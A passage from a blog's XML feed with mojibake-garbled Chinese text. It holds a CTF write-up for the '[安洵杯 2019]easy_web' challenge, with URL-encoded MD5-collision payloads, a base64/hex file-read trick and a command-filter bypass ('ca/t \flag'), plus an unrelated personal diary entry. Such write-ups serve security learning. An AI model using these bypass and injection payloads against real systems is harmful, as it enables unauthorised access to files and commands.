ï¼Œä»–è¯´ä»–å¯ä»¥ã€‚å¯èƒ½ä½¿æˆ‘çš„bpæœ‰é—®é¢˜ã€‚æˆ‘å®åœ¨ä¸æƒ³å»è§£å†³è¿™ä¸ªé—®é¢˜äº†ã€‚æ¥ä¸‹æ¥ç›´æ¥å†™å¤ç°ä»£ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282059387.png" alt="QQæˆªå›¾20220228205918"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">a=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>u<span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>ACZ<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>E<span class="hljs-meta">%</span><span class="hljs-number">94</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>B<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span><span class="hljs-number">29</span>Aq<span class="hljs-meta">%</span><span class="hljs-number">0</span>DoP<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span><span class="hljs-number">15</span>uB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>F<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">1</span><span class="hljs-meta">%</span>EAe<span class="hljs-meta">%</span><span class="hljs-number">0</span>D<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>EB<span class="hljs-meta">%</span>E<span class="hljs-number">7</span><span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>F<span class="hljs-meta">%</span>C<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>BI<span class="hljs-meta">%</span>D<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>B<span class="hljs-meta">%</span>A<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>BE-<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>J<span class="hljs-meta">%</span><span class="hljs-number">24</span>wh<span class="hljs-meta">%</span><span class="hljs-number">2</span>Bh<span class="hljs-number">6</span>C<span class="hljs-meta">%</span>EA<span class="hljs-meta">%</span>AFb<span class="hljs-meta">%</span>C<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>Ar<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>z<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>F<span class="hljs-number">66</span>y<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-number">5</span>p<span class="hljs-meta">%</span>F<span class="hljs-number">7</span>PH<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span>DDq<span class="hljs-meta">%</span><span class="hljs-number">9</span>F<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">2</span>Fw<span class="hljs-meta">%</span>B<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">99</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-number">4</span>C<span class="hljs-meta">%</span><span class="hljs-number">9</span>D<span class="hljs-meta">%</span>C<span class="hljs-number">7</span>P<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">3</span>P<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>FFr<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span>EEs<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span><span class="hljs-number">08</span>&amp;b=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>u<span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>ACZ<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>E<span class="hljs-meta">%</span><span class="hljs-number">94</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>B<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>A<span class="hljs-number">9</span>Aq<span class="hljs-meta">%</span><span class="hljs-number">0</span>DoP<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span><span class="hljs-number">15</span>uB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>F<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">1</span><span class="hljs-meta">%</span>EAe<span class="hljs-meta">%</span><span class="hljs-number">0</span>D<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>EB<span class="hljs-meta">%</span>E<span class="hljs-number">7</span><span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>FF<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>BI<span class="hljs-meta">%</span>D<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>B<span class="hljs-meta">%</span>A<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>BE-<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>J<span class="hljs-meta">%</span><span class="hljs-number">24</span>w<span class="hljs-meta">%</span>E<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>Bh<span class="hljs-number">6</span>C<span class="hljs-meta">%</span>EA<span class="hljs-meta">%</span>AFb<span class="hljs-meta">%</span>C<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>Ar<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>z<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>F<span class="hljs-number">6</span><span class="hljs-meta">%</span>B<span class="hljs-number">6</span>y<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-number">5</span>p<span class="hljs-meta">%</span>F<span class="hljs-number">7</span>PH<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span>DDq<span class="hljs-meta">%</span><span class="hljs-number">9</span>F<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">2</span>Fw<span class="hljs-meta">%</span>B<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">99</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>B<span class="hljs-number">4</span>B<span class="hljs-meta">%</span><span class="hljs-number">9</span>D<span class="hljs-meta">%</span>C<span class="hljs-number">7</span>P<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">3</span>P<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>FFr<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-symbol">ns3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span><span class="hljs-number">08</span><br></code></pre></td></tr></table></figure><p>è¿™é‡ŒåŒæ ·é™„ä¸Š(<code>h3å¸ˆå‚…</code>çš„)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>&amp;b<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((string)$_GET[<span class="hljs-string">&#x27;a&#x27;</span>]!==(string)$_GET[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])===md5($_GET[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>    echo <span class="hljs-string">&quot;Xsw6_a&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131658.png" alt="QQæˆªå›¾20220228210215"></p><h1 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h1><h2 id="åˆæ­¥"><a href="#åˆæ­¥" class="headerlink" title="åˆæ­¥"></a>åˆæ­¥</h2><p>æ‰“å¼€é¢˜ç›®å°±çœ‹åˆ°urlï¼š<a href="http://8c10f0a4-759d-4e70-a624-2f513d4feada.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=">http://8c10f0a4-759d-4e70-a624-2f513d4feada.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</a></p><p>imgåé¢è‚¯å®šæ˜¯åŠ å¯†ï¼ˆF12æ‰“å¼€å°±çœ‹åˆ°base64ï¼‰ï¼Œcmdç”¨æ¥å¹²ä»€ä¹ˆï¼Ÿæ‰§è¡Œå‘½ä»¤å‘—ã€‚<br>ç„¶åbase64è§£å¯†ä¸€ä¸‹ã€‚emmmï¼Œä»€ä¹ˆç©æ„ã€‚ä¸¤æ¬¡base64è§£ç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131468.png" alt="QQæˆªå›¾20220228210724"></p><p>å±å®çœ‹ä¸æ‡‚ã€‚ç›´æ¥æŸ¥çœ‹é¢˜ç›®ç»™çš„æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br></code></pre></td></tr></table></figure><p><code>hex2bin</code><strong>è§£ç åå…­è¿›åˆ¶ç¼–ç çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</strong><br>è§£ç ä¸º555.pngã€‚</p><h2 id="é«˜æ½®"><a href="#é«˜æ½®" class="headerlink" title="é«˜æ½®"></a>é«˜æ½®</h2><p>å¾ˆæ˜¾ç„¶è¿™é‡Œæˆ‘ä»¬åœ¨çœ‹è¿‡æºç ä¹‹åï¼Œå¯ä»¥ç›´æ¥ç»§ç»­å¾€ä¸‹è¯»ã€‚ä½†æ˜¯åœ¨çœŸæ­£çš„æ¯”èµ›çš„æ—¶å€™ã€‚è¿™æ—¶å€™æˆ‘ä»¬åº”è¯¥</p><p><code>$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</code></p><p>è¿™æ—¶å€™æˆ‘ä»¬åº”è¯¥å°†imgæ”¹æˆindex.phpæ–¹å‘åŠ å¯†å¾—åˆ°ã€‚</p><p>æ‰€ç”¨ç½‘å€ï¼š</p><p><a href="https://tool.lu/hexstr/">https://tool.lu/hexstr/</a></p><p><a href="https://tool.oschina.net/encrypt?type=3">https://tool.oschina.net/encrypt?type=3</a></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">TmprMlpUWTBOalUzT<span class="hljs-number">0</span>RKbE<span class="hljs-number">56</span>QTJPRG<span class="hljs-symbol">N3</span><br></code></pre></td></tr></table></figure><p>ç„¶åF12ï¼ŒæŸ¥çœ‹åˆ°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282124825.png" alt="QQæˆªå›¾20220228212429"></p><p>è§£ç åçœ‹åˆ°æºç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131307.png" alt="QQæˆªå›¾20220228212459"></p><p>åç»­å°±æ˜¯ç»•è¿‡MD5ï¼ˆéå¸¸å¯æ¶ï¼ï¼‰<br>è¿™é‡Œè¿˜æœ‰ä¸ªå°tipsã€‚ï¼ˆæºç ä¸­è¿‡æ»¤äº†ä¸€äº›å‘½ä»¤ã€‚ï¼‰<br>å¯ä»¥è¿™ä¹ˆæ„é€ ï¼ˆca&#x2F;t \flagï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131419.png" alt="QQæˆªå›¾20220228212459"></p><p>æ„Ÿè°¢<code>h3å¸ˆå‚…ã€å¤©ä¸Šæ˜Ÿå¸ˆå‚…</code></p><p>ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æƒ³å¿µå®è´</title>
    <link href="/2022/02/27/%E6%83%B3%E5%BF%B5%E5%AE%9D%E8%B4%9D/"/>
    <url>/2022/02/27/%E6%83%B3%E5%BF%B5%E5%AE%9D%E8%B4%9D/</url>
    
    <content type="html"><![CDATA[<p>æ¯ä¸€å‘¨æ€»ç»“å†™ä¸€ç¯‡å­ï¼ˆäº‰å–ï¼‰ï¼Œå¸Œæœ›å®è´ä¸ä¼šè§‰å¾—å¹³å¸¸å­¦ä¸œè¥¿å¿˜äº†å¥¹ã€‚è™½ç„¶è¯´æ˜¯åœ¨ä¸€ä¸ªå­¦æ ¡ï¼Œä½†æ˜¯å› ä¸ºç–«æƒ…åŸå› éš”äº†åä¸‡å…«åƒé‡Œã€‚</p><p>ä»Šå¤©è¿˜è·Ÿå©†å©†æ‰“ç”µè¯äº†ï¼Œå©†å©†èº«ä½“ä¹‹å‰ä¸€ç›´ä¸å¥½ï¼Œä»Šå¤©ç»ˆäºå¥½äº›äº†ã€‚ï¼ˆå¸Œæœ›æ—©ç‚¹é•¿å¤§ï¼Œå¯ä»¥èµšç‚¹å°é’±ï¼Œå­æ•¬å¥¹è€äººå®¶ï¼‰</p><h1 id="æœ‰ç‚¹æƒ³å®è´äº†"><a href="#æœ‰ç‚¹æƒ³å®è´äº†" class="headerlink" title="æœ‰ç‚¹æƒ³å®è´äº†"></a>æœ‰ç‚¹æƒ³å®è´äº†</h1><p>å‰å‡ å¤©è®¡åˆ’å»å³¨çœ‰å±±ç©ä¸€åœˆï¼ˆå¸Œæœ›åˆ°æ—¶å€™ä¸ä¼šä¸‹é›¨ï¼‰ã€‚çœŸçš„å°±ç¦»è°±è®¢é…’åº—çš„ç¥¨æ˜¯çœŸçš„è´µï¼ˆ499ä¸€æ™šï¼‰ã€‚<br>ä¸‹é¢æ˜¯è®¡åˆ’è¡¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272111813.jpeg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>å­¦ç”Ÿæ—¶ä»£çš„æ‹çˆ±</category>
      
    </categories>
    
    
    <tags>
      
      <tag>çˆ±æƒ…</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHA-1ç®—æ³•</title>
    <link href="/2022/02/27/SHA-1%E7%AE%97%E6%B3%95/"/>
    <url>/2022/02/27/SHA-1%E7%AE%97%E6%B3%95/</url>
    
